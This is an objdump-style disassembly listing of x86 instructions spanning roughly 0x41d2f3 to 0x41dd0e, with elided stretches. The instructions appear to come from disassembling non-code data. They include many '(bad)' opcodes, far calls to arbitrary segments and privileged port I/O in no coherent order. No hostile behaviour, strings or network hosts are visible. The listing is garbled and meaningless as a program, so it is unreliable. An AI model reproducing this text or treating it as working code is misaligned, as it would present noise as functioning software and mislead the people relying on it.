  41d2f3:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41d2f5:	jb     0x41d2c0
  41d2f7:	rol    DWORD PTR [eax+0x5a5aaed7],1
  41d2fd:	dec    ebp
  41d2fe:	(bad)  
  41d2ff:	sbb    BYTE PTR ds:0x1a5e450a,ch
  41d305:	loope  0x41d2fb
  41d307:	inc    ebp
  41d308:	fdivr  QWORD PTR [edi-0x26]
  41d30b:	out    dx,al
  41d30c:	fdivr  DWORD PTR [eax]
  41d30e:	fwait
  41d30f:	lods   al,BYTE PTR ds:[esi]
  41d310:	push   ebx
	...
  41d371:	add    BYTE PTR [eax],al
  41d373:	add    dh,bh
  41d375:	cmp    cl,0x54
  41d378:	(bad)  
  41d379:	jge    0x41d37a
  41d37b:	stos   BYTE PTR es:[edi],al
  41d37c:	lea    ebp,[edi]
  41d37e:	shr    BYTE PTR [ecx-0x7e],0x17
  41d382:	dec    esi
  41d383:	xchg   edx,eax
  41d384:	retf   
  41d385:	add    DWORD PTR ss:[eax],eax
  41d388:	add    eax,0x2d000001
  41d38d:	xor    al,0x22
  41d38f:	sub    ecx,DWORD PTR [ecx-0x33]
  41d392:	pusha  
  41d393:	dec    esp
  41d394:	fadd   st(2),st
  41d396:	xchg   ebx,eax
  41d397:	ret    
  41d398:	mov    ch,0x5d
  41d39a:	cmp    ebp,DWORD PTR [esi-0x4a7c9ca7]
  41d3a0:	xor    eax,0x1a18207b
  41d3a5:	inc    eax
  41d3a6:	mov    bl,0x8e
  41d3a8:	xchg   esi,eax
  41d3a9:	popa   
  41d3aa:	push   es
  41d3ab:	dec    ebp
  41d3ac:	xor    eax,0x651c656b
  41d3b1:	mov    al,0x5
  41d3b3:	call   0xa772:0xad0ab634
  41d3ba:	xchg   ecx,eax
  41d3bb:	xor    al,0x57
  41d3bd:	pop    ebp
  41d3be:	or     al,0xf6
  41d3c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3c1:	sbb    ch,BYTE PTR [ebx]
  41d3c3:	outs   dx,BYTE PTR ds:[esi]
  41d3c4:	leave  
  41d3c5:	ins    BYTE PTR es:[edi],dx
  41d3c6:	and    al,0xdc
  41d3c8:	gs push 0x4a19c38b
  41d3ce:	fwait
  41d3cf:	inc    esi
  41d3d0:	mov    dl,BYTE PTR [edi-0x5004b2bf]
  41d3d6:	jno    0x41d37f
  41d3d8:	mov    bl,0xe9
  41d3da:	aaa    
  41d3db:	test   al,0x56
  41d3dd:	xchg   edx,ebx
  41d3df:	xchg   esp,eax
  41d3e0:	ds mov dl,0x92
  41d3e3:	ror    BYTE PTR [ebx-0x8],cl
  41d3e6:	add    edx,DWORD PTR [ecx-0x2cd60d53]
  41d3ec:	sbb    BYTE PTR [esi],dh
  41d3ee:	jnp    0x41d3fb
  41d3f0:	push   edx
  41d3f1:	xlat   BYTE PTR ds:[ebx]
  41d3f2:	push   edi
  41d3f3:	add    al,0xcd
  41d3f5:	fisub  WORD PTR [eax-0x6c94cb47]
  41d3fb:	or     DWORD PTR [eax],esi
  41d3fd:	nop
  41d3fe:	setns  cl
  41d401:	sub    DWORD PTR [ebx-0x51d0cb6d],0xcb8d30e8
  41d40b:	jle    0x41d3e9
  41d40d:	xchg   esp,eax
  41d40e:	jmp    0xf11470bb
  41d413:	push   esi
  41d414:	push   eax
  41d415:	jl     0x41d3bb
  41d417:	arpl   sp,ax
  41d419:	(bad)
  41d41c:	stos   DWORD PTR es:[edi],eax
  41d41d:	dec    esi
  41d41e:	in     eax,0xdc
  41d420:	push   0x1d592b06
  41d425:	push   ds
  41d426:	lock out dx,al
  41d428:	loope  0x41d419
  41d42a:	push   ds
  41d42b:	jo     0x41d3f1
  41d42d:	dec    edi
  41d42e:	loop   0x41d3fd
  41d430:	rcl    BYTE PTR [edx-0x4e],cl
  41d433:	rol    BYTE PTR [edi],cl
  41d435:	mov    dl,0x16
  41d437:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d438:	mov    cl,0xe2
  41d43a:	dec    DWORD PTR [ebx+0x5]
  41d43d:	sub    bl,BYTE PTR ds:0x893f60c6
  41d443:	sbb    dl,bl
  41d445:	cmp    al,0x6e
  41d447:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d448:	push   ds
  41d449:	mov    bp,0xd896
  41d44d:	es push esi
  41d44f:	sbb    ch,bh
  41d451:	int3   
  41d452:	in     eax,0xaa
  41d454:	loope  0x41d470
  41d456:	ins    BYTE PTR es:[edi],dx
  41d457:	mov    edx,0xa6f82b23
  41d45c:	or     esi,edi
  41d45e:	imul   esi,DWORD PTR [eax+0x1b],0x63
  41d462:	and    eax,0xad662033
  41d467:	ins    DWORD PTR es:[edi],dx
  41d468:	mov    ebx,0x87c5d2f0
  41d46d:	push   0x45
  41d46f:	cmp    dh,bl
  41d471:	pop    ebp
  41d472:	and    ah,BYTE PTR [edx-0x3c330d93]
  41d478:	call   0xddaa:0x8359662
  41d47f:	neg    ebx
  41d481:	dec    edi
  41d482:	std    
  41d483:	dec    ebp
  41d484:	imul   ecx,esp,0xffffff8f
  41d487:	xlat   BYTE PTR ds:[ebx]
  41d488:	push   edi
  41d489:	adc    al,0xf1
  41d48b:	out    dx,eax
  41d48c:	repnz xor ecx,DWORD PTR [edx+0x5a01]
	...
  41d4f3:	add    dh,dh
  41d4f5:	rcl    BYTE PTR ss:[edx+edx*8+0x7d76f6f4],cl
  41d4fd:	nop
  41d4fe:	call   0xd0d9:0x6c4fec89
  41d505:	aaa    
  41d506:	add    DWORD PTR [eax],eax
  41d508:	add    eax,0xcf000001
  41d50d:	add    edi,eax
  41d50f:	add    DWORD PTR [esi],ebp
  41d511:	mov    al,0x27
  41d513:	push   cs
  41d514:	dec    edi
  41d515:	cmp    eax,0x2bd93596
  41d51a:	ror    bh,0x37
  41d51d:	jnp    0x41d50d
  41d51f:	and    DWORD PTR [ebp+0x365eeabe],ebx
  41d525:	hlt    
  41d526:	inc    ebp
  41d527:	pop    esp
  41d528:	mov    ebx,0x5fcde439
  41d52d:	mov    edx,0x5b993332
  41d532:	aad    0x51
  41d534:	sub    ah,BYTE PTR [ebx]
  41d536:	fdiv   QWORD PTR [eax-0x67]
  41d539:	cmp    DWORD PTR [ecx],0xfcf19d65
  41d53f:	or     eax,0x4013ae06
  41d544:	imul   eax,DWORD PTR ds:0x78b8e806,0xffffffbe
  41d54b:	pop    ds
  41d54c:	inc    edx
  41d54d:	ss mov esi,0x94b5c4f6
  41d553:	cld    
  41d554:	cmp    DWORD PTR [ebx+0x6a6eaed7],eax
  41d55a:	or     edi,DWORD PTR [edi+0x17]
  41d55d:	sbb    DWORD PTR [ebx+0xb],ebx
  41d560:	scas   eax,DWORD PTR es:[edi]
  41d561:	fdiv   DWORD PTR [edi+ebx*8-0x20e1e349]
  41d568:	sub    eax,0x68cbf399
  41d56d:	jg     0x41d5a4
  41d56f:	int3   
  41d570:	mov    ah,0x4a
  41d572:	retf   0xa02d
  41d575:	cld    
  41d576:	std    
  41d577:	test   BYTE PTR [eax-0x427f946a],dh
  41d57d:	inc    ebp
  41d57e:	xor    eax,0xb302cedd
  41d583:	icebp  
  41d584:	push   ss
  41d585:	sbb    ebp,DWORD PTR [edx+edx*4]
  41d588:	sbb    ecx,DWORD PTR [ecx+0x6d]
  41d58b:	pushf  
  41d58c:	cmp    ecx,ebx
  41d58e:	test   eax,0x1706db63
  41d593:	into   
  41d594:	xchg   ebp,eax
  41d595:	dec    edi
  41d596:	jne    0x41d5c4
  41d598:	mov    bh,0x3
  41d59b:	retf   0x4cd7
  41d59e:	popf   
  41d59f:	xor    ah,BYTE PTR [edi+0x6d643420]
  41d5a5:	aam    0x6f
  41d5a7:	aad    0x0
  41d5a9:	add    edx,DWORD PTR [ecx-0x53]
  41d5ac:	and    edx,DWORD PTR [eax-0x1e]
  41d5af:	leave  
  41d5b0:	sahf   
  41d5b1:	xchg   ebp,eax
  41d5b2:	test   BYTE PTR [ebx-0x543b65e0],al
  41d5b8:	pop    eax
  41d5b9:	(bad)  
  41d5ba:	out    0xe5,eax
  41d5bc:	loope  0x41d60a
  41d5be:	push   ss
  41d5bf:	test   DWORD PTR [eax],ecx
  41d5c1:	fbld   TBYTE PTR [edx+0x4740195]
  41d5c7:	loop   0x41d613
  41d5c9:	jnp    0x41d58e
  41d5cb:	mov    cl,0x73
  41d5cd:	mov    ecx,0x4e97326a
  41d5d2:	in     eax,0x1a
  41d5d4:	push   cs
  41d5d5:	sti    
  41d5d6:	fild   WORD PTR [edx+0x53]
  41d5d9:	mov    al,ds:0x4db36967
  41d5de:	or     ch,BYTE PTR [ebp+0x27]
  41d5e1:	(bad)  
  41d5e2:	std    
  41d5e3:	inc    edx
  41d5e4:	mov    ebx,0x1f32da7d
  41d5e9:	push   edi
  41d5ea:	add    BYTE PTR [ebp+0x4c80c257],bh
  41d5f0:	test   cl,cl
  41d5f2:	xor    DWORD PTR [eax],esi
  41d5f4:	pop    ss
  41d5f5:	mov    bl,0x8c
  41d5f7:	cld    
  41d5f8:	mov    ecx,0x41d51292
  41d5fd:	fcomp  QWORD PTR [ebp+0xfbbeec6]
  41d603:	inc    edx
  41d604:	sbb    al,0x22
  41d606:	loope  0x41d596
  41d608:	call   0x60875cf7
  41d60d:	enter  0x332c,0xe9
	...
  41d671:	add    BYTE PTR [eax],al
  41d673:	add    BYTE PTR [ecx+ebx*4+0x4c],bh
  41d677:	jbe    0x41d666
  41d679:	idiv   DWORD PTR [esi-0x65]
  41d67c:	or     eax,0x9966e435
  41d681:	fwait
  41d682:	sti    
  41d683:	pmullw mm7,QWORD PTR [eax]
  41d686:	add    DWORD PTR [eax],eax
  41d688:	add    eax,0x25000001
  41d68d:	push   esi
  41d68e:	idiv   bh
  41d690:	push   eax
  41d691:	xchg   ebx,eax
  41d692:	test   bh,ch
  41d694:	test   DWORD PTR [esi],ebp
  41d696:	xor    al,0xb6
  41d698:	sub    eax,0x22a333e0
  41d69d:	mov    ebx,0x8b54b775
  41d6a2:	or     BYTE PTR [eax-0x3e],ch
  41d6a5:	out    dx,al
  41d6a6:	dec    ecx
  41d6a7:	imul   ebx,DWORD PTR [esi+0x3a6311e1],0xffffffd4
  41d6ae:	not    eax
  41d6b0:	test   ax,0x605b
  41d6b4:	sbb    al,0xd4
  41d6b6:	adc    bh,BYTE PTR [edx-0x9]
  41d6b9:	pop    edi
  41d6ba:	in     eax,dx
  41d6bb:	aam    0x40
  41d6bd:	pop    ss
  41d6be:	ins    BYTE PTR es:[edi],dx
  41d6bf:	sbb    cl,dh
  41d6c1:	mov    al,BYTE PTR [eax]
  41d6c3:	js     0x41d720
  41d6c5:	leave  
  41d6c6:	(bad)  
  41d6c7:	jecxz  0x41d66c
  41d6c9:	les    ebx,FWORD PTR [esi]
  41d6cb:	stc    
  41d6cc:	bnd jmp 0x41d661
  41d6cf:	push   ds
  41d6d0:	int    0xaf
  41d6d2:	mov    ch,0x63
  41d6d4:	leave  
  41d6d5:	jmp    0xdf827e6c
  41d6da:	cmp    eax,0xc1f962bc
  41d6df:	xor    ebp,ecx
  41d6e1:	jmp    0x41d739
  41d6e3:	sub    BYTE PTR [ebx+0x1],ah
  41d6e6:	gs sbb eax,0xcf74276c
  41d6ec:	popf   
  41d6ed:	test   BYTE PTR [ecx+0x4e],dh
  41d6f0:	(bad)  
  41d6f1:	adc    DWORD PTR [ebp+0x6bad47dd],edi
  41d6f7:	jmp    DWORD PTR [ecx+0x68]
  41d6fa:	mov    edi,ebp
  41d6fc:	inc    ebx
  41d6fd:	inc    ebp
  41d6fe:	sbb    BYTE PTR [ebx],0xe
  41d701:	mov    ah,0xe3
  41d703:	xchg   esi,eax
  41d704:	inc    ecx
  41d705:	jecxz  0x41d699
  41d707:	jl     0x41d725
  41d709:	sbb    eax,0xbfc9d48
  41d70e:	add    esi,DWORD PTR [ecx+0x2b52dd4]
  41d714:	mov    bh,0x8d
  41d716:	(bad)  
  41d718:	sti    
  41d719:	push   0x2b9518a3
  41d71e:	loopne 0x41d71b
  41d720:	and    ecx,DWORD PTR [ebx+0x62]
  41d723:	stos   DWORD PTR es:[edi],eax
  41d724:	add    DWORD PTR [ebx],0x4cb1a69
  41d72a:	cs jp  0x41d6df
  41d72d:	jl     0x41d6b8
  41d72f:	out    dx,eax
  41d730:	jae    0x41d72d
  41d732:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d733:	loope  0x41d6b6
  41d735:	cmp    eax,0xc66e676a
  41d73a:	sahf   
  41d73b:	xor    BYTE PTR [ebx],cl
  41d73d:	(bad)  
  41d73e:	imul   DWORD PTR [ebx-0x40]
  41d741:	inc    edi
  41d742:	out    0x51,al
  41d744:	mov    DWORD PTR [ebx],ebx
  41d746:	mov    esp,0x98c21747
  41d74b:	(bad)  
  41d74c:	movq   QWORD PTR [eax+esi*8-0x77ac95e9],mm7
  41d754:	pop    esi
  41d755:	call   0xeaa0:0x377c6108
  41d75c:	jmp    FWORD PTR [edx-0x5ee87459]
  41d762:	lds    edx,FWORD PTR ds:0x85302640
  41d768:	cmp    BYTE PTR ds:0x33ca9f83,0x27
  41d76f:	in     al,dx
  41d770:	jp     0x41d70c
  41d772:	jg     0x41d706
  41d774:	adc    cl,BYTE PTR [edi-0x4f]
  41d777:	pop    es
  41d778:	ja     0x41d74b
  41d77a:	add    ebp,DWORD PTR [ecx]
  41d77c:	inc    edx
  41d77d:	data16 arpl WORD PTR [eax-0x3e90fae9],cx
  41d784:	imul   ebx,DWORD PTR [ebx-0x12c13633],0xf97ae5df
  41d78e:	mov    eax,ds:0xd7cb
	...
  41d7f3:	add    BYTE PTR [esi+ecx*8],ah
  41d7f6:	outs   dx,BYTE PTR ds:[esi]
  41d7f7:	sub    ch,dh
  41d7f9:	stos   BYTE PTR es:[edi],al
  41d7fa:	fs into 
  41d7fc:	jmp    0x41d789
  41d7fe:	leave  
  41d7ff:	aas    
  41d800:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d801:	push   es
  41d802:	scas   eax,DWORD PTR es:[edi]
  41d803:	popf   
  41d804:	fidivr DWORD PTR [ecx]
  41d806:	add    DWORD PTR [eax],eax
  41d808:	add    eax,0xca000001
  41d80d:	popf   
  41d80e:	push   ds
  41d80f:	std    
  41d810:	pop    ebp
  41d811:	popa   
  41d812:	idiv   DWORD PTR [edi-0x404316f7]
  41d818:	bound  ebx,QWORD PTR [edi]
  41d81a:	xor    BYTE PTR [esi],bl
  41d81c:	mov    WORD PTR [edx-0x7255e7e3],es
  41d822:	sub    DWORD PTR [eax+ebp*1+0x543ca572],edx
  41d829:	loop   0x41d82e
  41d82b:	addr16 out 0x3d,eax
  41d82e:	pushf  
  41d82f:	cwde   
  41d830:	pop    edi
  41d831:	les    esi,FWORD PTR [edi]
  41d833:	add    DWORD PTR [edx-0x4948f072],edi
  41d839:	(bad)  
  41d83a:	xor    ecx,ecx
  41d83c:	xlat   BYTE PTR ds:[ebx]
  41d83d:	arpl   WORD PTR [ebx+0x139052a7],bx
  41d843:	leave  
  41d844:	mov    edx,0x106da7bf
  41d849:	adc    ecx,esp
  41d84b:	push   0x69
  41d84d:	pop    esi
  41d84e:	jne    0x41d847
  41d850:	mov    bh,0xf
  41d852:	mov    al,0x36
  41d854:	push   edi
  41d855:	and    DWORD PTR [ecx+0x27],0xffffffc3
  41d859:	test   eax,0xa3786bb5
  41d85e:	mov    ds,WORD PTR [edi]
  41d860:	repnz dec eax
  41d862:	dec    edi
  41d863:	jl     0x41d7e5
  41d865:	imul   DWORD PTR [edi-0x469a6fd4]
  41d86b:	iret   
  41d86c:	mov    bh,0xb4
  41d86e:	dec    ebp
  41d86f:	ror    DWORD PTR [edx+edi*2],1
  41d872:	jns    0x41d850
  41d874:	mov    ds:0x3642f26c,eax
  41d879:	adc    esi,DWORD PTR [ebx+esi*1-0x6e8e975]
  41d880:	hlt    
  41d881:	xlat   BYTE PTR ds:[ebx]
  41d882:	inc    edi
  41d883:	enter  0xe374,0x46
  41d887:	mov    edi,0x827f8b59
  41d88c:	and    al,0x1f
  41d88e:	add    eax,0xad0adb5
  41d893:	add    al,0x77
  41d895:	xor    DWORD PTR [edi-0x5f],edi
  41d898:	pushf  
  41d899:	es loope 0x41d81c
  41d89c:	aaa    
  41d89d:	mov    eax,0xa3475d17
  41d8a2:	xchg   DWORD PTR [edx-0x34],edi
  41d8a5:	push   edx
  41d8a6:	data16 mov bh,0xa9
  41d8a9:	or     edx,edi
  41d8ab:	mov    dh,0x8b
  41d8ad:	pusha  
  41d8ae:	pop    esi
  41d8af:	add    ebx,esp
  41d8b1:	ins    DWORD PTR es:[edi],dx
  41d8b2:	dec    esi
  41d8b3:	jecxz  0x41d8af
  41d8b5:	mov    al,ds:0x6e796d11
  41d8ba:	add    DWORD PTR [ebx+0x5b],ebx
  41d8bd:	cld    
  41d8be:	jns    0x41d936
  41d8c0:	jmp    0xa64d:0xc562355
  41d8c7:	repnz mov edi,0xc992d0f3
  41d8cd:	mov    al,ds:0x6840fce3
  41d8d2:	and    bh,BYTE PTR [edi+0x5776e7e7]
  41d8d8:	test   DWORD PTR [ebp-0x2556cd0f],esp
  41d8de:	jp     0x41d8a1
  41d8e0:	add    eax,0x4838ba79
  41d8e5:	inc    eax
  41d8e6:	es faddp st(0),st
  41d8e9:	jmp    0x41d95f
  41d8eb:	add    edx,DWORD PTR [edx+0x53]
  41d8ee:	xor    eax,0xf70b0b1
  41d8f3:	ins    BYTE PTR es:[edi],dx
  41d8f4:	xchg   ebx,eax
  41d8f5:	ss pop ecx
  41d8f7:	jb     0x41d881
  41d8f9:	gs xchg ebx,eax
  41d8fb:	cmp    BYTE PTR [esi-0x7a],bl
  41d8fe:	and    eax,0xf2f0a859
  41d903:	popf   
  41d904:	xor    DWORD PTR [ecx-0x63fb38a8],edx
  41d90a:	mov    edx,0xa4043d66
  41d90f:	int3   
  41d910:	les    eax,FWORD PTR [eax]
	...
  41d972:	add    BYTE PTR [eax],al
  41d974:	les    ebp,FWORD PTR [edi+eax*1-0x64]
  41d978:	scas   eax,DWORD PTR es:[edi]
  41d979:	(bad)  
  41d97a:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d97e:	outs   dx,DWORD PTR ds:[esi]
  41d97f:	gs xchg edi,eax
  41d981:	mov    eax,ds:0x3adff884
  41d986:	add    DWORD PTR [eax],eax
  41d988:	add    eax,0xaa000001
  41d98d:	in     al,0x74
  41d98f:	mov    eax,0x9ce93c72
  41d994:	ins    BYTE PTR es:[edi],dx
  41d995:	outs   dx,BYTE PTR ds:[esi]
  41d996:	imul   ebp,ebx,0x5153ac89
  41d99c:	mov    ebx,0xd5ee2ee3
  41d9a1:	mov    ah,BYTE PTR [eax]
  41d9a3:	pop    ss
  41d9a4:	in     al,0x1f
  41d9a6:	and    al,0x1a
  41d9a8:	sahf   
  41d9a9:	jge    0x41d9cd
  41d9ab:	push   esi
  41d9ac:	mov    WORD PTR [eax+ecx*8],?
  41d9af:	bound  edx,QWORD PTR [edx-0x6f0d1962]
  41d9b5:	sub    BYTE PTR [ebp+0x148a0fa2],ch
  41d9bb:	lds    edx,FWORD PTR [ebp-0x367d5352]
  41d9c1:	leave  
  41d9c2:	mov    cl,0x2
  41d9c4:	xchg   BYTE PTR [esi+0x71],dh
  41d9c7:	add    BYTE PTR [edi],dl
  41d9c9:	or     cl,BYTE PTR [ebp+0x1c]
  41d9cc:	cmp    DWORD PTR [ecx-0x5a591a8b],0x50614415
  41d9d6:	ins    DWORD PTR es:[edi],dx
  41d9d7:	push   ecx
  41d9d8:	cmp    al,dh
  41d9da:	mov    eax,ds:0x7f784391
  41d9df:	sub    dh,cl
  41d9e1:	adc    BYTE PTR [ecx],dl
  41d9e3:	xor    esp,DWORD PTR [ebx+edi*4-0x17d85b7d]
  41d9ea:	loope  0x41d9d4
  41d9ec:	cmp    dl,BYTE PTR [ebx+0x56a4c864]
  41d9f2:	cld    
  41d9f3:	mov    ds:0x19b4a41a,eax
  41d9f8:	enter  0xa463,0x4b
  41d9fc:	adc    eax,0x95c39fdc
  41da01:	clc    
  41da02:	sbb    dl,al
  41da04:	mov    esi,0x48fbaf07
  41da09:	rol    ecx,cl
  41da0b:	push   ss
  41da0c:	call   0x6f92:0x3147484
  41da13:	fwait
  41da14:	pop    eax
  41da15:	xchg   ebp,eax
  41da16:	minps  xmm6,xmm4
  41da19:	jl     0x41da2f
  41da1b:	jo     0x41da81
  41da1d:	ins    BYTE PTR es:[edi],dx
  41da1e:	cmp    al,0xf3
  41da20:	daa    
  41da21:	and    DWORD PTR [esi-0x710487c6],ecx
  41da27:	adc    al,0xb8
  41da29:	sbb    ah,bh
  41da2b:	loope  0x41da46
  41da2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da2e:	adc    esp,0xfffffff8
  41da31:	mov    esp,DWORD PTR [ebp+0x63337a37]
  41da37:	xor    bl,BYTE PTR [esi]
  41da39:	out    0x3b,al
  41da3b:	(bad)  
  41da3c:	retf   0xf743
  41da3f:	cld    
  41da40:	jle    0x41da80
  41da42:	inc    eax
  41da43:	mov    eax,0x5946e731
  41da48:	ds xchg ecx,eax
  41da4a:	test   eax,0xf5c41fae
  41da4f:	mov    esp,DWORD PTR [esi+0x12dcbb56]
  41da55:	xor    DWORD PTR [ecx+0x48],eax
  41da58:	(bad)  
  41da59:	inc    esp
  41da5a:	xchg   DWORD PTR [ebx-0x78],ecx
  41da5d:	adc    DWORD PTR [eax+edx*4],ebp
  41da60:	dec    eax
  41da61:	push   ecx
  41da62:	test   BYTE PTR gs:[esi],cl
  41da65:	rol    DWORD PTR [edi],1
  41da67:	cli    
  41da68:	pusha  
  41da69:	or     esi,ecx
  41da6b:	and    BYTE PTR [ebx+0x4e],0xf4
  41da6f:	push   cs
  41da70:	shr    BYTE PTR [edx+0x4fdc1d33],1
  41da76:	sti    
  41da77:	inc    ecx
  41da78:	shl    BYTE PTR [ebx-0x65],1
  41da7b:	cli    
  41da7c:	lods   al,BYTE PTR ds:[esi]
  41da7d:	push   ebp
  41da7e:	mov    bl,0x18
  41da80:	add    edx,edx
  41da82:	xchg   ecx,eax
  41da83:	jo     0x41da70
  41da85:	cmp    DWORD PTR [eax],edi
  41da87:	mov    ebp,0xf9c96dec
  41da8c:	inc    edx
  41da8d:	stos   BYTE PTR es:[edi],al
  41da8e:	rcr    BYTE PTR [ebx+ebx*8],0x0
	...
  41daf2:	add    BYTE PTR [eax],al
  41daf4:	sbb    al,0x15
  41daf6:	jnp    0x41db4b
  41daf8:	jnp    0x41db79
  41dafa:	cmp    al,0x5f
  41dafc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dafd:	push   edi
  41dafe:	sbb    ebp,0x60
  41db01:	(bad)  
  41db02:	rol    DWORD PTR [eax],1
  41db04:	in     al,0x3b
  41db06:	add    DWORD PTR [eax],eax
  41db08:	add    eax,0x13000001
  41db0d:	adc    al,0xbb
  41db0f:	imul   ebp,DWORD PTR [bx],0x32
  41db13:	sahf   
  41db14:	pop    edx
  41db15:	and    edx,edx
  41db17:	fbstp  TBYTE PTR [edi+0x58380018]
  41db1d:	ss sub eax,0xddfd4280
  41db23:	ds retf 
  41db25:	in     al,dx
  41db26:	jns    0x41db50
  41db28:	xchg   ecx,eax
  41db29:	js     0x41db3c
  41db2b:	xor    al,0x8d
  41db2d:	shl    BYTE PTR [esi+0x40],cl
  41db30:	icebp  
  41db31:	push   ss
  41db32:	and    edx,edi
  41db34:	xor    eax,0xa84c2c92
  41db39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db3a:	jecxz  0x41dbb8
  41db3c:	xchg   edx,eax
  41db3d:	outs   dx,DWORD PTR ds:[esi]
  41db3e:	push   esi
  41db3f:	into   
  41db40:	fwait
  41db41:	mov    eax,0xcfba9c80
  41db46:	jg     0x41dbbe
  41db48:	dec    eax
  41db49:	retf   0x4f3a
  41db4c:	mov    bl,0xf3
  41db4e:	dec    esi
  41db4f:	fld    DWORD PTR [ebp+0x2a27c2c1]
  41db55:	inc    esi
  41db56:	xor    dl,bl
  41db58:	pop    ecx
  41db59:	fild   DWORD PTR [eax+eax*4+0x1fde4617]
  41db60:	jne    0x41daeb
  41db62:	lods   eax,DWORD PTR gs:[esi]
  41db64:	push   0x25
  41db66:	xchg   DWORD PTR [edx-0x23],edx
  41db69:	push   ebx
  41db6a:	push   ebp
  41db6b:	lock sbb ebx,esp
  41db6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db6f:	aam    0xb3
  41db71:	push   es
  41db72:	jmp    0xbae8:0x26869a28
  41db79:	enter  0x7ef6,0x61
  41db7d:	daa    
  41db7e:	rcr    bl,1
  41db80:	in     eax,0x8d
  41db82:	jp     0x41db7f
  41db84:	in     al,dx
  41db85:	pop    esi
  41db86:	sub    dh,BYTE PTR [ebx+0x2b050ede]
  41db8c:	mov    al,ds:0xecdf335c
  41db91:	aam    0xf
  41db93:	out    dx,eax
  41db94:	js     0x41db83
  41db96:	add    eax,0x9063aacf
  41db9b:	adc    BYTE PTR [esi-0x6ef4f18c],ah
  41dba1:	cdq    
  41dba2:	(bad)  
  41dba3:	adc    al,0x33
  41dba5:	cmp    ebp,esi
  41dba7:	sub    BYTE PTR [eax+0x762835be],ah
  41dbad:	(bad)  
  41dbae:	sbb    al,0xbe
  41dbb0:	bound  eax,QWORD PTR [eax+ecx*2+0x33d75b66]
  41dbb7:	dec    DWORD PTR [edx+0x41]
  41dbba:	push   edx
  41dbbb:	xchg   edx,eax
  41dbbc:	sar    esi,0x66
  41dbbf:	jg     0x41dc20
  41dbc1:	test   eax,0xfd4fc0a1
  41dbc6:	dec    eax
  41dbc7:	and    esp,DWORD PTR [ebp+0x77c354ee]
  41dbcd:	mov    cl,0xad
  41dbcf:	lods   al,BYTE PTR ds:[esi]
  41dbd0:	cmp    ebp,ebx
  41dbd2:	ins    DWORD PTR es:[edi],dx
  41dbd3:	aas    
  41dbd4:	int    0xe9
  41dbd6:	lea    ebx,[ebx]
  41dbd8:	adc    BYTE PTR [ebp+0x32],ah
  41dbdb:	or     BYTE PTR [edx+0x621fba6],0x5c
  41dbe2:	bound  ebp,QWORD PTR [edx+ebx*8-0x37]
  41dbe6:	cld    
  41dbe7:	repnz call 0xb267:0xa111dab4
  41dbef:	mov    ebx,0xc671178e
  41dbf4:	mov    ds:0x4b8353cb,al
  41dbf9:	stos   DWORD PTR es:[edi],eax
  41dbfa:	stc    
  41dbfb:	lds    ecx,FWORD PTR [ebx-0x80]
  41dbfe:	lods   al,BYTE PTR ds:[esi]
  41dbff:	xor    edx,DWORD PTR [ecx+0x3f8e9a2b]
  41dc05:	mov    edx,DWORD PTR [ebx+0x4890bcff]
  41dc0b:	test   BYTE PTR [ecx+0x59],cl
  41dc0e:	xchg   ebx,eax
  41dc0f:	loopne 0x41dc90
	...
  41dc71:	add    BYTE PTR [eax],al
  41dc73:	add    BYTE PTR [edi-0x36],ch
  41dc76:	adc    eax,0xefdfb598
  41dc7b:	jmp    DWORD PTR [edi-0x734f2fb0]
  41dc81:	jno    0x41dc36
  41dc83:	jg     0x41dc6e
  41dc85:	cmp    al,0x1
  41dc87:	add    BYTE PTR ds:0x7a000001,al
  41dc8d:	(bad)  
  41dc8e:	jns    0x41dc49
  41dc90:	stos   DWORD PTR es:[edi],eax
  41dc91:	cmp    al,0xa3
  41dc93:	xchg   esi,eax
  41dc94:	enter  0x57e0,0xfb
  41dc98:	ins    DWORD PTR es:[edi],dx
  41dc99:	jo     0x41dcac
  41dc9b:	pop    ss
  41dc9c:	jae    0x41dc72
  41dc9e:	cs ja  0x41dcd2
  41dca1:	xchg   ebx,eax
  41dca2:	ror    DWORD PTR [ebx+0x3d],cl
  41dca5:	(bad)  
  41dca6:	loopne 0x41dc6a
  41dca8:	mov    DWORD PTR [eax+0x50],edi
  41dcab:	xchg   edi,eax
  41dcac:	dec    edx
  41dcad:	jns    0x41dcb5
  41dcaf:	into   
  41dcb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcb1:	pushf  
  41dcb2:	jbe    0x41dd17
  41dcb4:	mov    ebx,DWORD PTR [esi+esi*2]
  41dcb7:	and    eax,0xcf36b715
  41dcbc:	dec    esi
  41dcbd:	iret   
  41dcbe:	pop    esp
  41dcbf:	mov    cl,0xda
  41dcc1:	(bad)  
  41dcc2:	adc    DWORD PTR [esi-0x5d],esp
  41dcc5:	aaa    
  41dcc6:	into   
  41dcc7:	dec    esp
  41dcc8:	test   eax,0x4fabca44
  41dccd:	xchg   esi,eax
  41dcce:	(bad)  
  41dccf:	scas   al,BYTE PTR es:[edi]
  41dcd0:	or     edi,eax
  41dcd2:	mov    edi,0xbd0c9c32
  41dcd7:	add    edi,eax
  41dcd9:	xchg   BYTE PTR ds:0x2c393e72,al
  41dcdf:	std    
  41dce0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dce1:	dec    esi
  41dce2:	ja     0x41dcab
  41dce4:	adc    al,0xe2
  41dce6:	mov    dl,0xc8
  41dce8:	sub    DWORD PTR [ebx+0x52fbccd7],0xc8a14335
  41dcf2:	scas   eax,DWORD PTR es:[edi]
  41dcf3:	(bad)  
  41dcf4:	pop    esp
  41dcf5:	test   DWORD PTR [edi-0x4b9c70ac],ebx
  41dcfb:	ss pop esi
  41dcfd:	jle    0x41dd30
  41dcff:	sub    esi,DWORD PTR [ecx]
  41dd01:	pop    ebx
  41dd02:	xchg   eax,edi
  41dd04:	push   eax
  41dd05:	mov    WORD PTR [edx-0x1ba8e7a],fs
  41dd0b:	push   edi
  41dd0c:	jle    0x41dc96
  41dd0e:	jp     0x41dca2
